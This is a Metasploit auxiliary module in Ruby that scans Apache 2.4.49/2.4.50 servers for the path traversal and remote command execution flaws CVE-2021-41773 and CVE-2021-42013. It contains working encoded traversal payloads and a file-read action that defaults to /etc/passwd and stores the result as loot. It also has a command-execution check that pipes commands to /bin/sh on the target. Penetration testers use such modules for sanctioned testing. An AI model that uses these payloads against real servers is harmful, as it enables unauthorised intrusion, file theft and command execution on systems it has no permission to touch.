##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',
        'Description' => %q{
          This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
          If files outside of the document root are not protected by 'require all denied' and CGI has been explicitly enabled,
          it can be used to execute arbitrary commands (Remote Command Execution).
          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
        },
        'References' => [
          ['CVE', '2021-41773'],
          ['CVE', '2021-42013'],
          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],
          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],
          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],
          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']
        ],
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit auxiliary module
          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
        ],
        'DisclosureDate' => '2021-05-10',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        },
        'Actions' => [
          [
            'CHECK_TRAVERSAL',
            {
              'Description' => 'Check for vulnerability.'
            }
          ],
          [
            'CHECK_RCE',
            {
              'Description' => 'Check for RCE (if mod_cgi is enabled).'
            }
          ],
          [
            'READ_FILE',
            {
              'Description' => 'Read file on the remote server.'
            }
          ]
        ],
        'DefaultAction' => 'CHECK_TRAVERSAL'
      )
    )

    register_options([
      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),
      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),
      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),
      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])
    ])
  end

  def exec_traversal(cmd)
    send_request_raw({
      'method' => Rex::Text.rand_text_alpha(3..4),
      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),
      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}"
    })
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def pick_payload
    case datastore['CVE']
    when 'CVE-2021-41773'
      payload = '.%2e/'
    when 'CVE-2021-42013'
      payload = '.%%32%65/'
    else
      payload = ''
    end

    payload
  end

  def read_traversal
    send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(@target_uri, @traversal.to_s)
    })
  end

  def run_host(ip)
    @proto = (ssl ? 'https' : 'http')

    case action.name
    when 'CHECK_TRAVERSAL'
      @target_uri = datastore['TARGETURI']
      @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'

      response = read_traversal
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      if response.code == 200 && response.body.include?('root:x:0:0:')
        print_good(message("The target is vulnerable to #{datastore['CVE']}."))

        vprint_status("Obtained HTTP response code #{response.code}.")
        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )

        return Exploit::CheckCode::Vulnerable
      end
      print_error(message("The target is not vulnerable to #{datastore['CVE']}."))

      return Exploit::CheckCode::Safe
    when 'CHECK_RCE'
      @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'
      rand_str = Rex::Text.rand_text_alpha(4..8)

      response = exec_traversal("echo #{rand_str}")
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      if response.code == 200 && response.body.include?(rand_str)
        print_good(message("The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled)."))
        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )

        return Exploit::CheckCode::Vulnerable
      end
      print_error(message("The target is not vulnerable to #{datastore['CVE']} (requires mod_cgi to be enabled)."))

      return Exploit::CheckCode::Safe
    when 'READ_FILE'
      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?

      @target_uri = datastore['TARGETURI']
      @traversal = pick_payload * datastore['DEPTH'] << datastore['FILEPATH']

      response = read_traversal
      unless response
        print_error(message('No response, target seems down.'))

        return Exploit::CheckCode::Unknown
      end

      vprint_status("Obtained HTTP response code #{response.code}.")
      if response.code == 500
        print_warning(message("The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled)."))
        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )
      end

      if response.code == 500 || response.body.empty?
        print_error('Nothing was downloaded')

        return Exploit::CheckCode::Vulnerable if response.code == 500
      end

      if response.code == 200
        vprint_good("#{peer} \n#{response.body}")
        path = store_loot(
          'apache.traversal',
          'application/octet-stream',
          ip,
          response.body,
          datastore['FILEPATH']
        )
        print_good("File saved in: #{path}")

        report_vuln(
          host: target_host,
          name: name,
          refs: references
        )

        return Exploit::CheckCode::Vulnerable
      end

      return Exploit::CheckCode::Safe
    end
  end
end
